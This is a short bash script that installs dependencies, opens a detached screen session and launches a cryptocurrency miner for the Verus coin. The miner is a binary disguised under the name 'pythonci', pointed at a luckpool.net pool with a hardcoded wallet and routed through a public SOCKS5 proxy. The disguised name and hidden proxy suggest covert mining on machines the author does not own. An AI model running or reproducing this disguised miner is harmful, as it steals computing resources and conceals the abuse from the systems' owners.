#!/bin/bash
sudo apt update
sudo apt install screen -y 
sudo apt isntall libjansson4 -y
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WR=0AA
PY=socks5://184.181.217.210:4145
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 6 --proxy=$PY
